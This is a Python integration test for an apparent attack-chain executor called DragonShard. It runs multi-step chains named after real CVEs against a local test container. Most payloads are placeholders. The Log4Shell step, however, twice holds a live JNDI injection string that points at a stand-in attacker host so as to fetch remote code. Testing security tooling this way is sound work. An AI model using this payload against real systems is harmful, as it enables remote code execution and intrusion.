#!/usr/bin/env python3
"""
Integration test script for DragonShard Executor Stress Test Scenarios
Tests complex multi-step vulnerabilities (2, 3, and 4 steps) against the stress test container
"""

import sys
import os
import time
import json
import requests
from pathlib import Path

# Add the project root to the Python path
sys.path.insert(0, str(Path(__file__).parent.parent))

from dragonshard.executor.executor import AttackExecutor, ExecutionStatus
from dragonshard.executor.session_manager import SessionManager, AuthCredentials
from dragonshard.executor.state_graph import StateGraph, ServiceType, VulnerabilityLevel
from dragonshard.planner.chain_planner import AttackChain, AttackStep, AttackType, AttackComplexity, AttackImpact
from dragonshard.fuzzing.fuzzer import Fuzzer
from dragonshard.api_inference.unified_crawler import UnifiedCrawler


def setup_logging():
    """Set up logging for the stress test"""
    import logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('stress_test.log'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)


def wait_for_container(url, max_retries=30):
    """Wait for the stress test container to be ready"""
    logger = setup_logging()
    logger.info(f"Waiting for stress test container at {url}")
    
    for i in range(max_retries):
        try:
            response = requests.get(f"{url}/health", timeout=5)
            if response.status_code == 200:
                logger.info("✅ Stress test container is ready!")
                return True
        except requests.exceptions.RequestException:
            pass
        
        logger.info(f"Attempt {i+1}/{max_retries}: Container not ready yet...")
        time.sleep(2)
    
    logger.error("❌ Stress test container failed to start")
    return False


def create_stress_test_chains():
    """Create complex multi-step attack chains for stress testing"""
    
    # 2-Step Vulnerabilities
    log4shell_chain = {
        "name": "Log4Shell (CVE-2021-44228) - 2 Steps",
        "description": "Authentication bypass + Log injection with JNDI lookup",
        "steps": [
            {
                "step_id": "auth_bypass",
                "vulnerability_type": "Authentication Bypass",
                "target": "http://localhost:8085/api/v1/login",
                "method": "POST",
                "payload": {"username": "admin", "password": "admin123"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "log_injection",
                "vulnerability_type": "Log Injection",
                "target": "http://localhost:8085/api/v1/log",
                "method": "POST",
                "payload": {"message": "${jndi:ldap://attacker.com/exploit}"},
                "expected_response": {"status": "success"}
            }
        ]
    }

    bluekeep_chain = {
        "name": "BlueKeep (CVE-2019-0708) - 2 Steps",
        "description": "Port scanning + RDP exploitation",
        "steps": [
            {
                "step_id": "port_scan",
                "vulnerability_type": "Port Scanning",
                "target": "http://localhost:8085/api/v1/scan",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "rdp_exploit",
                "vulnerability_type": "RDP Exploitation",
                "target": "http://localhost:8085/api/v1/exploit",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            }
        ]
    }

    # 3-Step Vulnerabilities
    printnightmare_chain = {
        "name": "PrintNightmare (CVE-2021-34527) - 3 Steps",
        "description": "Discovery + Authentication + Exploitation",
        "steps": [
            {
                "step_id": "discovery",
                "vulnerability_type": "Service Discovery",
                "target": "http://localhost:8085/api/v2/discover",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "auth",
                "vulnerability_type": "Authentication",
                "target": "http://localhost:8085/api/v2/auth",
                "method": "POST",
                "payload": {"username": "printadmin", "password": "print123"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "exploit",
                "vulnerability_type": "Print Spooler Exploitation",
                "target": "http://localhost:8085/api/v2/exploit",
                "method": "POST",
                "payload": {"target": "192.168.1.100", "payload": "exploit_hash"},
                "expected_response": {"status": "success"}
            }
        ]
    }

    zerologon_chain = {
        "name": "Zerologon (CVE-2020-1472) - 3 Steps",
        "description": "Discovery + Authentication + Domain takeover",
        "steps": [
            {
                "step_id": "netlogon_discovery",
                "vulnerability_type": "Service Discovery",
                "target": "http://localhost:8085/api/v2/netlogon",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "domain_auth",
                "vulnerability_type": "Domain Authentication",
                "target": "http://localhost:8085/api/v2/domain_auth",
                "method": "POST",
                "payload": {"domain": "CORP.LOCAL", "username": "administrator", "password": "admin123"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "zerologon_exploit",
                "vulnerability_type": "Domain Controller Exploitation",
                "target": "http://localhost:8085/api/v2/zerologon",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            }
        ]
    }

    # 4-Step Vulnerabilities
    proxylogon_chain = {
        "name": "ProxyLogon (CVE-2021-26855) - 4 Steps",
        "description": "Discovery + Authentication + SSRF + RCE",
        "steps": [
            {
                "step_id": "exchange_discovery",
                "vulnerability_type": "Service Discovery",
                "target": "http://localhost:8085/api/v3/discover_exchange",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "exchange_auth",
                "vulnerability_type": "Exchange Authentication",
                "target": "http://localhost:8085/api/v3/exchange_auth",
                "method": "POST",
                "payload": {"email": "admin@corp.local", "password": "exchange123"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "proxylogon_ssrf",
                "vulnerability_type": "Server-Side Request Forgery",
                "target": "http://localhost:8085/api/v3/proxylogon_ssrf",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "proxylogon_rce",
                "vulnerability_type": "Remote Code Execution",
                "target": "http://localhost:8085/api/v3/proxylogon_rce",
                "method": "POST",
                "payload": {"target": "192.168.1.100", "payload": "rce_payload"},
                "expected_response": {"status": "success"}
            }
        ]
    }

    vcenter_chain = {
        "name": "vCenter (CVE-2021-21972) - 4 Steps",
        "description": "Discovery + Authentication + SSRF + File Upload",
        "steps": [
            {
                "step_id": "vcenter_discovery",
                "vulnerability_type": "Service Discovery",
                "target": "http://localhost:8085/api/v3/discover_vcenter",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "vcenter_auth",
                "vulnerability_type": "vCenter Authentication",
                "target": "http://localhost:8085/api/v3/vcenter_auth",
                "method": "POST",
                "payload": {"username": "administrator@vsphere.local", "password": "vcenter123"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "vcenter_ssrf",
                "vulnerability_type": "Server-Side Request Forgery",
                "target": "http://localhost:8085/api/v3/vcenter_ssrf",
                "method": "POST",
                "payload": {"target": "192.168.1.100"},
                "expected_response": {"status": "success"}
            },
            {
                "step_id": "vcenter_upload",
                "vulnerability_type": "File Upload",
                "target": "http://localhost:8085/api/v3/vcenter_upload",
                "method": "POST",
                "payload": {"target": "192.168.1.100", "file_content": "malicious_content"},
                "expected_response": {"status": "success"}
            }
        ]
    }

    return [
        log4shell_chain,
        bluekeep_chain,
        printnightmare_chain,
        zerologon_chain,
        proxylogon_chain,
        vcenter_chain
    ]


def demonstrate_stress_test_functionality():
    """Demonstrate the stress test functionality"""
    logger = setup_logging()
    
    logger.info("🚀 Starting DragonShard Executor Stress Test")
    logger.info("=" * 60)

    # Initialize components
    executor = AttackExecutor()
    session_manager = SessionManager()
    state_graph = StateGraph()

    # Wait for container
    if not wait_for_container("http://localhost:8085"):
        logger.error("❌ Failed to start stress test container")
        return False

    # Create attack chains using proper AttackChain objects
    chains = []
    
    # 2-Step Log4Shell Chain
    log4shell_step1 = AttackStep(
        step_id="auth_bypass",
        step_name="Authentication Bypass",
        attack_type=AttackType.AUTHENTICATION_BYPASS,
        target_url="http://localhost:8085/api/v1/login",
        payload="admin:admin123",
        expected_outcome="Authentication successful",
        success_criteria="200 response with success status"
    )
    
    log4shell_step2 = AttackStep(
        step_id="log_injection",
        step_name="Log Injection",
        attack_type=AttackType.TEMPLATE_INJECTION,
        target_url="http://localhost:8085/api/v1/log",
        payload="${jndi:ldap://attacker.com/exploit}",
        expected_outcome="Log injection successful",
        success_criteria="200 response with success status"
    )
    
    log4shell_chain = AttackChain(
        chain_id="log4shell_chain",
        chain_name="Log4Shell (CVE-2021-44228) - 2 Steps",
        description="Authentication bypass + Log injection with JNDI lookup",
        target_host="localhost:8085",
        attack_steps=[log4shell_step1, log4shell_step2],
        total_impact=AttackImpact.CRITICAL,
        total_complexity=AttackComplexity.MEDIUM,
        success_probability=0.8,
        estimated_duration=30
    )
    chains.append(log4shell_chain)
    
    # 3-Step PrintNightmare Chain
    printnightmare_step1 = AttackStep(
        step_id="discovery",
        step_name="Service Discovery",
        attack_type=AttackType.SSRF,
        target_url="http://localhost:8085/api/v2/discover",
        payload="192.168.1.100",
        expected_outcome="Service discovered",
        success_criteria="200 response with service info"
    )
    
    printnightmare_step2 = AttackStep(
        step_id="auth",
        step_name="Authentication",
        attack_type=AttackType.AUTHENTICATION_BYPASS,
        target_url="http://localhost:8085/api/v2/auth",
        payload="printadmin:print123",
        expected_outcome="Authentication successful",
        success_criteria="200 response with auth token"
    )
    
    printnightmare_step3 = AttackStep(
        step_id="exploit",
        step_name="Print Spooler Exploitation",
        attack_type=AttackType.REMOTE_CODE_EXECUTION,
        target_url="http://localhost:8085/api/v2/exploit",
        payload="exploit_hash",
        expected_outcome="Exploitation successful",
        success_criteria="200 response with exploit result"
    )
    
    printnightmare_chain = AttackChain(
        chain_id="printnightmare_chain",
        chain_name="PrintNightmare (CVE-2021-34527) - 3 Steps",
        description="Discovery + Authentication + Exploitation",
        target_host="localhost:8085",
        attack_steps=[printnightmare_step1, printnightmare_step2, printnightmare_step3],
        total_impact=AttackImpact.CRITICAL,
        total_complexity=AttackComplexity.HIGH,
        success_probability=0.7,
        estimated_duration=45
    )
    chains.append(printnightmare_chain)
    
    # 4-Step ProxyLogon Chain
    proxylogon_step1 = AttackStep(
        step_id="exchange_discovery",
        step_name="Exchange Discovery",
        attack_type=AttackType.SSRF,
        target_url="http://localhost:8085/api/v3/discover_exchange",
        payload="192.168.1.100",
        expected_outcome="Exchange server discovered",
        success_criteria="200 response with exchange info"
    )
    
    proxylogon_step2 = AttackStep(
        step_id="exchange_auth",
        step_name="Exchange Authentication",
        attack_type=AttackType.AUTHENTICATION_BYPASS,
        target_url="http://localhost:8085/api/v3/exchange_auth",
        payload="admin@corp.local:exchange123",
        expected_outcome="Exchange authentication successful",
        success_criteria="200 response with exchange token"
    )
    
    proxylogon_step3 = AttackStep(
        step_id="proxylogon_ssrf",
        step_name="ProxyLogon SSRF",
        attack_type=AttackType.SSRF,
        target_url="http://localhost:8085/api/v3/proxylogon_ssrf",
        payload="192.168.1.100",
        expected_outcome="SSRF successful",
        success_criteria="200 response with SSRF result"
    )
    
    proxylogon_step4 = AttackStep(
        step_id="proxylogon_rce",
        step_name="ProxyLogon RCE",
        attack_type=AttackType.REMOTE_CODE_EXECUTION,
        target_url="http://localhost:8085/api/v3/proxylogon_rce",
        payload="rce_payload",
        expected_outcome="RCE successful",
        success_criteria="200 response with RCE result"
    )
    
    proxylogon_chain = AttackChain(
        chain_id="proxylogon_chain",
        chain_name="ProxyLogon (CVE-2021-26855) - 4 Steps",
        description="Discovery + Authentication + SSRF + RCE",
        target_host="localhost:8085",
        attack_steps=[proxylogon_step1, proxylogon_step2, proxylogon_step3, proxylogon_step4],
        total_impact=AttackImpact.CRITICAL,
        total_complexity=AttackComplexity.CRITICAL,
        success_probability=0.6,
        estimated_duration=60
    )
    chains.append(proxylogon_chain)
    
    logger.info(f"📋 Created {len(chains)} complex attack chains:")
    for i, chain in enumerate(chains, 1):
        logger.info(f"  {i}. {chain.chain_name} - {chain.description}")

    # Execute 2-step vulnerabilities
    logger.info("\n🔍 Testing 2-Step Vulnerabilities:")
    logger.info("-" * 40)
    
    result = executor.execute_attack_chain(chains[0])  # Log4Shell
    if result.status == ExecutionStatus.COMPLETED:
        logger.info(f"✅ {chains[0].chain_name} - SUCCESS")
        logger.info(f"   Steps completed: {result.completed_steps}")
        logger.info(f"   Execution time: {result.total_execution_time:.2f}s")
    else:
        logger.error(f"❌ {chains[0].chain_name} - FAILED")

    # Execute 3-step vulnerabilities
    logger.info("\n🔍 Testing 3-Step Vulnerabilities:")
    logger.info("-" * 40)
    
    result = executor.execute_attack_chain(chains[1])  # PrintNightmare
    if result.status == ExecutionStatus.COMPLETED:
        logger.info(f"✅ {chains[1].chain_name} - SUCCESS")
        logger.info(f"   Steps completed: {result.completed_steps}")
        logger.info(f"   Execution time: {result.total_execution_time:.2f}s")
    else:
        logger.error(f"❌ {chains[1].chain_name} - FAILED")

    # Execute 4-step vulnerabilities
    logger.info("\n🔍 Testing 4-Step Vulnerabilities:")
    logger.info("-" * 40)
    
    result = executor.execute_attack_chain(chains[2])  # ProxyLogon
    if result.status == ExecutionStatus.COMPLETED:
        logger.info(f"✅ {chains[2].chain_name} - SUCCESS")
        logger.info(f"   Steps completed: {result.completed_steps}")
        logger.info(f"   Execution time: {result.total_execution_time:.2f}s")
    else:
        logger.error(f"❌ {chains[2].chain_name} - FAILED")

    # Test concurrent execution
    logger.info("\n🔄 Testing Concurrent Execution:")
    logger.info("-" * 40)
    
    concurrent_results = executor.execute_multiple_chains(chains)
    successful_chains = sum(1 for result in concurrent_results if result.status == ExecutionStatus.COMPLETED)
    
    logger.info(f"Concurrent execution completed:")
    logger.info(f"  Total chains: {len(concurrent_results)}")
    logger.info(f"  Successful: {successful_chains}")
    logger.info(f"  Failed: {len(concurrent_results) - successful_chains}")

    # Test state graph integration
    logger.info("\n🗺️  Testing State Graph Integration:")
    logger.info("-" * 40)
    
    # Add discovered hosts and vulnerabilities
    host_id = state_graph.add_host("192.168.1.100", "Windows Server 2019")
    service1_id = state_graph.add_service(host_id, 3389, ServiceType.HTTPS, "Microsoft RDP")
    service2_id = state_graph.add_service(host_id, 445, ServiceType.HTTPS, "Microsoft SMB")
    service3_id = state_graph.add_service(host_id, 443, ServiceType.HTTPS, "Microsoft Exchange")
    service4_id = state_graph.add_service(host_id, 9443, ServiceType.HTTPS, "VMware vCenter")
    
    state_graph.add_vulnerability(service1_id, "CVE-2019-0708", VulnerabilityLevel.CRITICAL, "BlueKeep", "RDP vulnerability")
    state_graph.add_vulnerability(service2_id, "CVE-2021-34527", VulnerabilityLevel.CRITICAL, "PrintNightmare", "SMB vulnerability")
    state_graph.add_vulnerability(service3_id, "CVE-2021-26855", VulnerabilityLevel.CRITICAL, "ProxyLogon", "Exchange vulnerability")
    state_graph.add_vulnerability(service4_id, "CVE-2021-21972", VulnerabilityLevel.CRITICAL, "vCenter SSRF", "vCenter vulnerability")
    
    vuln_summary = state_graph.get_vulnerability_summary()
    topology = state_graph.get_network_topology()
    
    logger.info(f"State Graph Summary:")
    logger.info(f"  Hosts: {topology.get('total_hosts', 0)}")
    logger.info(f"  Services: {topology.get('total_services', 0)}")
    logger.info(f"  Vulnerabilities: {vuln_summary.get('total_vulnerabilities', 0)}")

    # Test session management
    logger.info("\n🔐 Testing Session Management:")
    logger.info("-" * 40)
    
    session_id = session_manager.create_session("localhost:8085")
    credentials = AuthCredentials(username="admin", password="admin123")
    auth_result = session_manager.authenticate_session(session_id, credentials)
    
    if auth_result:
        logger.info("✅ Session authentication successful")
        sessions = session_manager.get_all_sessions()
        logger.info(f"  Active sessions: {len(sessions)}")
    else:
        logger.error("❌ Session authentication failed")

    # Export results
    logger.info("\n📊 Exporting Results:")
    logger.info("-" * 40)
    
    try:
        # Export execution results
        executor.export_execution_results("stress_test_execution_results.json")
        logger.info("✅ Execution results exported to stress_test_execution_results.json")
        
        # Export state graph
        state_graph.export_graph("stress_test_state_graph.json")
        logger.info("✅ State graph exported to stress_test_state_graph.json")
        
        # Export sessions
        session_manager.export_sessions("stress_test_sessions.json")
        logger.info("✅ Sessions exported to stress_test_sessions.json")
        
    except Exception as e:
        logger.error(f"❌ Export failed: {e}")

    logger.info("\n🎉 Stress test completed successfully!")
    return True


def main():
    """Main function"""
    print("🧪 DragonShard Executor Stress Test")
    print("=" * 50)
    print("Testing complex multi-step vulnerabilities:")
    print("  • 2-step vulnerabilities (Log4Shell, BlueKeep)")
    print("  • 3-step vulnerabilities (PrintNightmare, Zerologon)")
    print("  • 4-step vulnerabilities (ProxyLogon, vCenter)")
    print("  • Concurrent execution")
    print("  • State graph integration")
    print("  • Session management")
    print("=" * 50)

    try:
        success = demonstrate_stress_test_functionality()
        if success:
            print("\n✅ All stress tests completed successfully!")
            return 0
        else:
            print("\n❌ Stress tests failed!")
            return 1
    except Exception as e:
        print(f"\n💥 Stress test error: {e}")
        return 1


if __name__ == '__main__':
    exit(main()) 